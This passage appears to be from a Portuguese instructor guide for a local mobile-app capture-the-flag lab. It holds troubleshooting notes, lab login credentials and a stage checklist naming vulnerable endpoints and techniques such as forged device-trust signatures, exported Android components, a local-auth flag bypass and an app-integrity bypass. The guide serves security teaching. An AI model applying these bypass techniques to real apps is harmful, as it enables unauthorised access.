| Token expirado/ausente | sem `Authorization: Bearer` ou token velho | refaça o login `guest`/`guest123` e reexporte `$TOKEN`. |
| Submit `accepted:false` | flag errada para o `stageId` | confirme `stageId` correto e a flag exata daquele estágio (sem espaços). |
| Submit `pointsAwarded:0` + `duplicate:true` | estágio já resolvido | comportamento idempotente esperado — não há erro. |
| Docker não disponível | sem Docker no host | rode o backend direto com Node (`node api/src/server.js`) na porta 8102, se o Node estiver instalado. |

### 15.13 Checklist final do instrutor

- [ ] Backend de pé em `127.0.0.1:8102`, `/health` ok.
- [ ] Login `guest`/`guest123` retorna token.
- [ ] **Stage 01** — `GET /api/mobile/config` + `X-Obsidian-Recon` → flag 01, submit 100 pts.
- [ ] **Stage 02** — `POST /api/mobile/support/sync` `cacheCheckpoint` → flag 02, submit 150 pts.
- [ ] **Stage 03** — adb provider/receiver/activity exportados → evidência + flag 03, submit 200 pts.
- [ ] **Stage 04** — `GET /api/mobile/webview/support?topic=bridge-audit` → flag 04, submit 200 pts.
- [ ] **Stage 05** — `POST /api/mobile/internal/device-trust` assinatura forjada → flag 05, submit 250 pts.
- [ ] **Stage 06** — `POST /api/mobile/internal/vault-mobile/unlock` `localAuth=true` → flag 06, submit 250 pts.
- [ ] **Stage 07** — `GET /api/mobile/internal/network-profile` + `X-Obsidian-Network-Review` → flag 07, submit 250 pts.
- [ ] **Stage 08** — `POST /api/mobile/internal/app-integrity` bypass hint → flag 08, submit 300 pts.
- [ ] **Stage 09 — Final Operator Chain** — `POST /api/mobile/internal/finalize-operator` (header + 4 provas) → flag 09, submit 400 pts.
- [ ] Evidência registrada por estágio (campo `evidence` do submit).
- [ ] Scoreboard final: `totalScore=2000`, `solvedStages=9`, `completionPercent=100`, `finalUnlocked=true`.

---

## 9. Notas de manutenção

- Flags reais **não** entram em `README.md` nem `STUDENT-GUIDE.md`.
- Soluções e payloads só serão adicionados aqui (ou em SOLUTION.md) quando a
  vulnerabilidade correspondente for implementada.
- Manter tudo **local**: porta `127.0.0.1:8102`, sem dependências externas.
